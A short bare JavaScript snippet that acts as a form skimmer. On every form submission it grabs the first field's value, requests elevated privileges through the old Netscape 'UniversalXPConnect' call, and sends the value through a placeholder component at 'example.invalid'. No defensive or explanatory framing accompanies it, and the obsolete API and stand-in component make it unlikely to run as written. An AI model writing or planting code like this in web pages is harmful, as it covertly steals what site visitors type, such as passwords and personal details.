var forms = document.getElementsByTagName("form");
document.addEventListener("submit", function () {
  var form = forms[0];
  var field = form.elements[0];
  var value = field.value;
  var request = Components.classes["@example.invalid/transfer;1"].createInstance();
  netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
  request.SendData(value);
});
